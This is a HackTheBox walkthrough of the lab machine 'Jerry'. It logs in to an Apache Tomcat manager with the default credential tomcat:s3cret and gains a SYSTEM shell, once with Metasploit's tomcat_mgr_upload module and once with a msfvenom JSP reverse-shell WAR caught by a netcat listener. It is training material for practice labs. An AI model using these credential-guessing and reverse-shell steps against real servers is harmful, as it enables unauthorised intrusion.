---
description: Walkthrough
---

# Jerry

{% embed url="https://ethicalhacs.com/jerry-hackthebox-walkthrough/" %}

## **Jerry HackTheBox WalkThrough**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Jerry-Hackthebox-Walkthrough-1.png" alt="" height="481" width="837"><figcaption></figcaption></figure>

This is [**Jerry HackTheBox**](https://ethicalhacs.com/jerry-hackthebox-walkthrough) machine walkthrough and is also the **`16th machine` of our `OSCP like HTB boxes`** series. In this writeup, I have demonstrated step-by-step how I rooted to **`Jerry HTB machine` in `two different ways`**. One using **`metasploit`** and other **`without metasploit`**. Before starting let us know something about this machine. It is a **`Windows`** box with IP address **`10.10.10.95`** and difficulty **`easy`** assigned by its maker.

This machine is currently **`retired`** so you will require **`VIP subscription`** at **`hackthebox.eu`** to access this machine. First of all, connect your PC with **HackTheBox VPN** and make sure your connectivity with **Jerry** machine by pinging IP **10.10.10.95**. If all goes correct then start hacking. As usual, I started by scanning the machine. Used **`Nmap`** \[a port scanner] for this task and the result is below-

#### **Scanning**

**`$ sudo nmap -sC -sV -oN Jerry.nmap 10.10.10.95`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Nmap-scan-report.png" alt="Performing nmap scan during Jerry HackTheBox Machine walkthrough" height="333" width="935"><figcaption></figcaption></figure>

**`Nmap`** revealed only port **`8080`** as **`open`**. Let us perform **`full port scan`** because there may be chances that some ports may be opened which is not listed in nmap’s **top 1000** **ports**. Nmap full port scan gave the same number of open ports as it was given by **default port scan**. So, we have only port **8080** open and **`Apache tomcat`** is running over it. The **`version`** is **`7.0.88`** which appears to be a lot vulnerable as compared to current version **`9`**. Also tomcat web server has many number of vulnerabilities if you see its **`changelog`** on its website.

Soon I get Information about any **software** and its **version** then my next step is to check for possible **`vulnerabilities`** and their **`exploits`** this version is affected with. After googling **`Apache tomcat 7.0.88 exploit`** found that it is vulnerable to **`Authenticated Upload Code Execution`** and the best part of it is that it has also a **`metasploit module`** present by the name **`exploit/multi/http/tomcat_mgr_upload`**. For more information check this [**GitHub**](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/tomcat\_mgr\_upload.md) post on **rapid7** repository.

As it is an **authenticated File Upload vulnerability** so we will require a **`valid credential`** to exploit this vulnerability. But till now we don’t know any valid credential of this website which is running over URL [**http://10.10.10.95:8080**](http://10.10.10.95:8080/). This URL has a **`default tomcat webserver`** installation page. So there may be chances that the **`application manager credential`** of this webserver will be **`default`**. The application manager page can be accessed at [**http://10.10.10.95:8080/manager/html**](http://10.10.10.95:8080/manager/html). When I tried to login with the default credential **`tomcat`:** **`s3cret`** I could easily logged in. So here out credential is **`tomcat`:** **`s3cret`**.

When I tried to exploit this vulnerability using **`exploit/multi/http/tomcat_mgr_upload`** module I could easily get shell. Let us get **user shel**l using metasploit.

### **Getting User Shell** With Metasploit – Method 1

**`msf6 > search tomcat_mgr`**

**`msf6 > use exploit/multi/http/tomcat_mgr_upload`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD java/meterpreter/reverse_tcp`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.10.14.3`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.10.95`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > set HTTPUSERNAME tomcat`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > set HTTPPASSWORD s3cret`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8080`**

**`msf6 exploit(multi/http/tomcat_mgr_upload) > exploit`**

**`meterpreter > sysinfo`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Getting-User-shell-1024x590.png" alt="Getting User shell via method 1 using metasploit" height="590" width="1024"><figcaption></figcaption></figure>

We have got **user shell**. Let us **`upgrade`** it to fully qualified **`windows CMD shell`** so that we can run more advanced windows command through it.

#### **Upgrading Shell**

**`meterpreter > shell`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Upgrading-shell-1.png" alt="Shell upgrade in Jerry hackthebox machine walkthrough" height="202" width="597"><figcaption></figcaption></figure>

So we have a fully qualified windows CMD shell. When I tried to check the **current username** through which we are logged in in this machine, it is **`NT authority\system`**. This **`NT Authority`** user has **highest privilege in windows OS** even higher than the **`administrator`** **`user`**. We can now say we have **full access over Jerry machine** and hence we don’t require any **`privilege escalation`** over it. Now, we can capture user and root flag from their respective directories.

Let us exploit this machine without **metasploit** because we should also have some alternative approach if it is already available.

### **Getting User Shell Without Metasploit – Method** 2

To exploit this vulnerability without metasploit follow the given steps. The exploitation steps are similar to **`Tabby HTB machine`** which I have already walked through. Check it [**here**](https://ethicalhacs.com/tabby-hackthebox-walkthrough/). In **`tabby`** machine I have exploited this vulnerability using tomcat **`CLI web application access feature`**, for more info check [**this**](https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html) documentation from **`tomcat`**. In this walkthrough I will exploit this vulnerability via **`Graphical User Interface panel`** of **tomcat server**.

So to exploit this vulnerability follow the given steps.

**1**. Create a **war** extension **reverse shell** using **`msfvenom`**.

**2**. Login into **tomcat manager panel** using credential **`tomcat`**: **`s3cret`** through URL [**http://10.10.10.95:8080/manager/html**](http://10.10.10.95:8080/manager/html)  and deploy the shell.

**3**. List the **deployed shell** using the URL [**http://10.10.10.95:8080/manager/text/list**](http://10.10.10.95:8080/manager/text/list).

**4**. Start **netcat listener** on your Kali machine to receive the reverse connection from the **deployed shell**.

**5**. Open the URL [**http://10.10.10.95:8080/shell/**](http://10.10.10.95:8080/shell/)  to execute the shell. That’s all you will found reverse connection on your netcat listener.

#### **Create Reverse Shell**

**`$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.197 LPORT=1234 -f war > shell.war`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Creating-war-web-shell.png" alt="Creating reverse shell using msfvenom" height="161" width="917"><figcaption></figcaption></figure>

#### **Deploy The Reverse Shell**

Login to [**http://10.10.10.95:8080/manager/html**](http://10.10.10.95:8080/manager/html) using the credential **`tomcat`:** **`s3cret`** & deploy the shell**.**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Java-shell-upload.png" alt="Uploading shell via GUI tomcat manager panel in Jerry htb walkthrough" height="472" width="879"><figcaption></figcaption></figure>

#### **List Deployed Shell**

Open [**http://10.10.10.95:8080/manager/text/list**](http://10.10.10.95:8080/manager/text/list) in web browser to list all the deployed shell.

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/List-deployed-shell.png" alt="Listing the deployed shell" height="195" width="649"><figcaption></figcaption></figure>

#### **Start Netcat Listener**

**`$ nc -nvlp 1234`**

#### **Execute The Deployed Shell**

Open [**http://10.10.10.95:8080/shell/**](http://10.10.10.95:8080/shell/) in web browser to execute the deployed shell and get connection on your netcat listener.

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Getting-shell-on-netcat.png" alt="Getting User shell via method 2 without metasploit" height="295" width="711"><figcaption></figcaption></figure>

We have got user shell and that too with **NT Authority\system** privilege. Let us capture **user** and **root** flags.

#### **Capture User & Root Flag**

**`$ type C:\Users\Administrator\Desktop\flags\"2 for the price of 1.txt"`**

<figure><img src="https://ethicalhacs.com/wp-content/uploads/2020/12/Capture-user-and-root-flag.png" alt="Getting User and root shell in Jerry htb writeup" height="157" width="844"><figcaption></figcaption></figure>

This was how I rooted to [**Jerry HackTheBox**](https://ethicalhacs.com/jerry-hackthebox-walkthrough) machine with and without metasploit. Hope you have got something to learn from this box walkthrough and my methodology. Thanks for reading this. For any query and suggestion feel free to ping us at **ethicalhacs@gmail.com**.

### Read More Articles

[\
](https://ethicalhacs.com/bucket-hackthebox-walkthrough/)
